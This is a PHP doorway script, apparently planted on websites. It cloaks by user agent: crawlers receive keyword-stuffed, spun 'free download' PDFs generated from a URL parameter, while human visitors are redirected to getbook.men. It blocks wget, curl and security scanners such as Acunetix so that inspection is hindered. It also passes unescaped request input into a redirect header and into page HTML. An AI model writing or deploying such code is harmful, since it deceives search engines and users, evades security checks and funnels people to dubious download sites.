<?php
date_default_timezone_set('Asia/Jakarta');
if(bad_bots()){
	header("HTTP/1.1 403 Unauthorized");
	exit();
}

if(!is_bot()){
	header("location: http://getbook.men/".$_GET['title'].".pdf");
	exit();	
}	

//CACHE
	if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE'])){
		header('HTTP/1.1 304 Not Modified');
        die();
	}
	//END CACHE
																//CACHE HEADER
																	header('Cache-control: max-age='.(60*60*24*365));
																	header('Expires: '.gmdate(DATE_RFC1123,time()+60*60*24*365));
																	header('Last-Modified: '.gmdate(DATE_RFC1123,time()));
																	header('X-Robots-Tag: NOARCHIVE, NOTRANSLATE', true);
																//END CACHE HEADER
																

$pathnames= $_GET['title'];

$keyword = preg_replace('![^a-z0-9]+!i', ' ', $pathnames);
$keyword = trim(strtoupper(strtolower($keyword)));
$slug = $pathnames;
$page_file_name= $pathnames.'.pdf';
$posisi_file= $page_file_name;

$META_TITLE= acak_keywords($keyword);

$THE_CONTENTS= GENERATE_CONTENTS($keyword, $page_file_name, $META_TITLE);

//GENERATE PDF ON THE FLY
require('writehtmlclass.php');
	$pdf=new PDF_HTML('P', 'mm', 'A4');
    $pdf->SetFont('Times','',14);
	$pdf->SetAuthor($META_TITLE);
	$pdf->SetCreator($META_TITLE);
	$pdf->SetTitle($META_TITLE);
	$pdf->SetSubject($META_TITLE);
	$pdf->SetKeywords($META_TITLE);
	
	$pdf->AddPage();
	$htmla = $THE_CONTENTS;
	if(ini_get('magic_quotes_gpc')=='1')
        $htmla=stripslashes($htmla);
    $pdf->WriteHTML($htmla);
	$pdf->Output("Storage/".$posisi_file, 'I');	
	$pdf->Close();








function acak_keywords($keywords){
	$arrays= explode(" ", $keywords);
	
$fixeds = join_keywords($arrays).', ';
$fixeds .= join_keywords($arrays).', ';
$fixeds .= join_keywords($arrays).', ';
$fixeds .= join_keywords($arrays);

return $fixeds;
}

function join_keywords($keywords=array()){
	shuffle($keywords);
	return implode(" ", $keywords);
}


function GENERATE_CONTENTS($page_title, $path_links, $keywords_acak){
	$page_title= $page_title;
	$THE_CONTENTS= '<h1>'.$page_title.' - Free Download '.$page_title.'</h1><br><br>
	
<h2>'.$keywords_acak.'</h2><br><br>	
<br><br><strong>'.$page_title.'</strong> How easy reading concept can improve to be an effective person? <em>'.$page_title.'</em> review is a very simple task. 
Yet, how many people can be lazy to read? They prefer to invest their idle time to talk or hang out. 
When in fact, review <u>'.$page_title.'</u> certainly provide much more likely to be effective through with hard work.
<br><br>
For everyone, whether you are going to start to join with others to consult a book, this <em>'.$page_title.'</em> is very advisable. 
And you should get the <strong>'.$page_title.'</strong> driving under the download link we provide. 
Why should you be here? If you want other types of books, you will always find the <em>'.$page_title.'</em> and Economics, politics ,, social scientific research, religious beliefs, fictions, and many other publications are provided. 
These publications are readily available in software documents.
<br><br>
Because the software documents? How <strong>'.$page_title.'</strong>, many people also need to acquire before driving. Yet sometimes it\'s so far to get the '.$page_title.' book, also in various other countries or cities. 
So, to help you locate <em>'.$page_title.'</em> guides that will definitely support, we help you by offering lists. It is not just a list. We will give the book links recommended '.$page_title.' that can be downloaded and installed directly. 
So definitely you do not will need more time and days for the position and other publications.
<br><br>
To download <i>'.$page_title.'</i>, you might be to certainly find our website that includes a comprehensive assortment of manuals listed. 
Our library will be the biggest of the which may have literally hundreds of a large number of different products represented. 
<br><br>
You\'ll see that you have specific sites catered to different product types or categories, brands or niches. 
So according to what exactly you happen to be searching, you will be able to choose user manuals and guides to match your own needs.';

$THE_CONTENTS .= '<br><br><b><a href="http://getbook.men/'.$path_links.'">DOWNLOAD '.$page_title.'</a></b>';

return $THE_CONTENTS;
	
}



function bad_bots(){
if(!isset($_SERVER['HTTP_USER_AGENT'])){
return true;
}
if(empty($_SERVER['HTTP_USER_AGENT'])){
return true;
}
return preg_match('/(woobot|internetVista|openlinkprofiler|spbot|baidu|wget|curl|acunetix|fhscan)/i', $_SERVER['HTTP_USER_AGENT']);
}


function is_bot(){
	if(!isset($_SERVER['HTTP_USER_AGENT'])){
	return false;
	}
	if(empty($_SERVER['HTTP_USER_AGENT'])){
	return false;
	}
$patern= 'duckduckgo|bot|google|yandex|bing|yahoo|msn|image|preview|partner|bingpreview|bingbot|msnbot';
return preg_match('/('.$patern.')/i', $_SERVER['HTTP_USER_AGENT']);
}
